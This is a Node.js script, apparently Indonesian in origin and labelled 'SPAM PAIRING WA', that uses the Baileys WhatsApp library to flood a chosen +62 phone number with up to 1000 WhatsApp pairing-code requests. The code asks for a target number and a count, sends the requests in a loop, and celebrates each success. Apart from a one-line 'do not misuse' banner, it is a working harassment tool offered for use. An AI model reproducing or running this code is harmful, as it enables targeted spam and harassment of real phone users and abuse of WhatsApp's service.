const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

// Rainbow colors for animations
const colors = {
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
    reset: '\x1b[0m'
};

const rainbow = ['\x1b[31m', '\x1b[33m', '\x1b[32m', '\x1b[36m', '\x1b[34m', '\x1b[35m'];

// Animation frames
const frames = {
    spinner: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
    dots: ['∙∙∙', '●∙∙', '∙●∙', '∙∙●', '∙∙∙'],
    wave: ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█', '▇', '▆', '▅', '▄', '▃', '▂']
};

class Animator {
    constructor() {
        this.interval = null;
    }
    
    rainbowText(text) {
        let result = '';
        for (let i = 0; i < text.length; i++) {
            result += rainbow[i % rainbow.length] + text[i];
        }
        return result + colors.reset;
    }
    
    gradientText(text, startColor, endColor) {
        const gradient = [];
        for (let i = 0; i < text.length; i++) {
            const ratio = i / text.length;
            const color = this.interpolateColor(startColor, endColor, ratio);
            gradient.push(color + text[i]);
        }
        return gradient.join('') + colors.reset;
    }
    
    interpolateColor(start, end, ratio) {
        // Simple color interpolation for terminal
        const colors = [colors.red, colors.yellow, colors.green, colors.cyan, colors.blue, colors.magenta];
        const startIdx = colors.indexOf(start);
        const endIdx = colors.indexOf(end);
        const idx = Math.floor(startIdx + (endIdx - startIdx) * ratio);
        return colors[idx % colors.length];
    }
    
    animateSpinner(text, speed = 100) {
        let i = 0;
        this.interval = setInterval(() => {
            readline.cursorTo(process.stdout, 0);
            process.stdout.write(colors.cyan + frames.spinner[i] + colors.reset + ' ' + text);
            i = (i + 1) % frames.spinner.length;
        }, speed);
    }
    
    animateProgress(current, total, text) {
        const width = 30;
        const progress = Math.min(current / total, 1);
        const filled = Math.round(width * progress);
        const empty = width - filled;
        
        const bar = colors.green + '█'.repeat(filled) + colors.gray + '░'.repeat(empty) + colors.reset;
        const percent = Math.round(progress * 100);
        
        readline.cursorTo(process.stdout, 0);
        process.stdout.write(`${bar} ${percent}% | ${text}`);
    }
    
    stopAnimation() {
        if (this.interval) {
            clearInterval(this.interval);
            this.interval = null;
        }
        console.log();
    }
    
    typewriter(text, delay = 50) {
        return new Promise((resolve) => {
            let i = 0;
            process.stdout.write(colors.cyan);
            
            const type = () => {
                if (i < text.length) {
                    process.stdout.write(text.charAt(i));
                    i++;
                    setTimeout(type, delay);
                } else {
                    process.stdout.write(colors.reset + '\n');
                    resolve();
                }
            };
            
            type();
        });
    }
}

const animator = new Animator();

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { 
        rl.question(colors.cyan + text + colors.reset, (answer) => {
            rl.close();
            resolve(answer);
        });
    });
};

async function showBanner() {
    console.clear();
    
    const banner = `
${colors.magenta}╔══════════════════════════════════════════════════════════╗${colors.reset}
${colors.cyan}║                                                        ║${colors.reset}
${colors.blue}║  ██████╗ ██╗     ██╗ ██████╗ ██╗    ██╗███████╗██████╗   ║${colors.reset}
${colors.green}║  ██╔══██╗██║     ██║██╔═══██╗██║    ██║██╔════╝██╔══██╗  ║${colors.reset}
${colors.yellow}║  ██████╔╝██║     ██║██║   ██║██║ █╗ ██║█████╗  ██████╔╝  ║${colors.reset}
${colors.red}║  ██╔═══╝ ██║     ██║██║   ██║██║███╗██║██╔══╝  ██╔══██╗  ║${colors.reset}
${colors.magenta}║  ██║     ███████╗██║╚██████╔╝╚███╔███╔╝███████╗██║  ██║  ║${colors.reset}
${colors.cyan}║  ╚═╝     ╚══════╝╚═╝ ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ║${colors.reset}
${colors.blue}║                                                        ║${colors.reset}
${colors.magenta}╚══════════════════════════════════════════════════════════╝${colors.reset}

${colors.yellow}         [ S P A M  P A I R I N G  W A ]${colors.reset}
${colors.cyan}         ≫ Renovasi oleh: Rim ≪${colors.reset}
${colors.green}         ≫ Original by: FlowFalcon ≪${colors.reset}
${colors.red}         ≫ Jangan disalahgunakan! ≪${colors.reset}
`;

    await animator.typewriter(banner, 10);
    
    console.log(animator.rainbowText('\n' + '═'.repeat(60)));
    
    console.log(colors.cyan + `
╔══════════════════════════════════════════════════════════╗
║                🎯 PANDUAN PENGGUNAAN 🎯                 ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  ${colors.yellow}1.${colors.reset} ${colors.white}Masukkan nomor target (62xxxxxxxxxx)${colors.reset}           ║
║  ${colors.yellow}2.${colors.reset} ${colors.white}Tentukan jumlah spam (1-1000)${colors.reset}                  ║
║  ${colors.yellow}3.${colors.reset} ${colors.white}Tunggu proses berjalan${colors.reset}                        ║
║  ${colors.yellow}4.${colors.reset} ${colors.white}Pastikan koneksi internet stabil${colors.reset}               ║
║                                                          ║
║  ${colors.red}⚠  HANYA UNTUK NOMOR +62 SAJA ⚠${colors.reset}                      ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
` + colors.reset);

    await new Promise(resolve => setTimeout(resolve, 1000));
}

async function KleeProject() {
    await showBanner();
    
    try {
        // Animated input for phone number
        animator.animateSpinner('Memulai koneksi...', 150);
        await new Promise(resolve => setTimeout(resolve, 2000));
        animator.stopAnimation();
        
        const { state } = await useMultiFileAuthState('./69/session');
        const KleeBotInc = makeWASocket({
            logger: pino({ level: "silent" }),
            printQRInTerminal: false,
            auth: state,
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 0,
            keepAliveIntervalMs: 10000,
            emitOwnEvents: true,
            fireInitQueries: true,
            generateHighQualityLinkPreview: true,
            syncFullHistory: true,
            markOnlineOnConnect: true,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
        });
        
        // Get phone number with animation
        await animator.typewriter(colors.green + "\n📱 MASUKKAN NOMOR TARGET: " + colors.reset, 30);
        const phoneNumber = await question(colors.yellow + "→ " + colors.reset);
        
        if (!phoneNumber.startsWith('62')) {
            console.log(colors.red + "❌ ERROR: Nomor harus diawali dengan 62!" + colors.reset);
            return;
        }
        
        // Get spam count with animation
        await animator.typewriter(colors.green + "\n🎯 JUMLAH SPAM: " + colors.reset, 30);
        const KleeCodes = parseInt(await question(colors.yellow + "→ " + colors.reset));

        if (isNaN(KleeCodes) || KleeCodes <= 0 || KleeCodes > 1000) {
            console.log(colors.red + '❌ Contoh: 20 (1-1000)' + colors.reset);
            return;
        }

        console.log(colors.cyan + "\n" + "═".repeat(60) + colors.reset);
        console.log(animator.rainbowText(`🚀 MEMULAI PROSES SPAM...`) + colors.reset);
        console.log(colors.yellow + `📞 Target: ${phoneNumber}` + colors.reset);
        console.log(colors.yellow + `🔢 Jumlah: ${KleeCodes} kode` + colors.reset);
        console.log(colors.cyan + "═".repeat(60) + colors.reset);

        // Progress animation
        let successCount = 0;
        let failCount = 0;
        
        const progressInterval = setInterval(() => {
            animator.animateProgress(successCount + failCount, KleeCodes, 
                `Sukses: ${colors.green}${successCount}${colors.reset} | Gagal: ${colors.red}${failCount}${colors.reset}`);
        }, 100);

        // Spam pairing codes
        for (let i = 0; i < KleeCodes; i++) {
            try {
                animator.animateSpinner(` Mengirim kode ${i + 1}/${KleeCodes}...`, 100);
                
                let code = await KleeBotInc.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                
                animator.stopAnimation();
                successCount++;
                
                // Success animation
                console.log(colors.green + `✅ Sukses! Kode ke-${i + 1} terkirim → ${code}` + colors.reset);
                
                // Random success messages
                const successMsgs = [
                    "💥 BOOM! Kode terkirim!",
                    "🎯 Tepat sasaran!",
                    "🚀 Meluncur ke target!",
                    "⚡ Super cepat!",
                    "🎪 Sirkus spam dimulai!",
                    "🌈 Warna-warni spam!",
                    "🔥 Api menyala!",
                    "💫 Magic bekerja!"
                ];
                const randomMsg = successMsgs[Math.floor(Math.random() * successMsgs.length)];
                console.log(colors.magenta + `   ${randomMsg}` + colors.reset);
                
            } catch (error) {
                animator.stopAnimation();
                failCount++;
                console.log(colors.red + `❌ Gagal mengirim kode ke-${i + 1}: ${error.message}` + colors.reset);
            }
            
            // Delay between requests
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        
        clearInterval(progressInterval);
        console.log();
        console.log(colors.cyan + "═".repeat(60) + colors.reset);
        
        // Final statistics with animation
        await animator.typewriter(colors.yellow + "📊 STATISTIK AKHIR:" + colors.reset, 20);
        console.log(colors.green + `   ✅ Sukses: ${successCount} kode` + colors.reset);
        console.log(colors.red + `   ❌ Gagal: ${failCount} kode` + colors.reset);
        console.log(colors.blue + `   📈 Total: ${KleeCodes} permintaan` + colors.reset);
        
        const successRate = ((successCount / KleeCodes) * 100).toFixed(2);
        console.log(colors.magenta + `   🎯 Tingkat keberhasilan: ${successRate}%` + colors.reset);
        
        console.log(colors.cyan + "═".repeat(60) + colors.reset);
        
        // Celebration animation
        if (successCount > 0) {
            console.log(animator.rainbowText("\n🎉 SPAM BERHASIL DILAKUKAN! 🎉"));
            console.log(colors.yellow + "\n💖 Renovasi oleh: Rim" + colors.reset);
            console.log(colors.cyan + "👑 Original by: FlowFalcon" + colors.reset);
            
            // Fireworks animation
            const fireworks = ['✨', '🎇', '🎆', '💥', '⭐', '🌟', '💫'];
            for (let i = 0; i < 5; i++) {
                let firework = '';
                for (let j = 0; j < 10; j++) {
                    firework += fireworks[Math.floor(Math.random() * fireworks.length)];
                }
                console.log(rainbow[i % rainbow.length] + firework + colors.reset);
                await new Promise(resolve => setTimeout(resolve, 200));
            }
        }
        
    } catch (error) {
        animator.stopAnimation();
        console.log(colors.red + `\n❌ ERROR: ${error.message}` + colors.reset);
        console.log(colors.yellow + "💡 Tips: Periksa koneksi internet dan coba lagi!" + colors.reset);
    }
}

// Start the application
console.clear();
KleeProject();
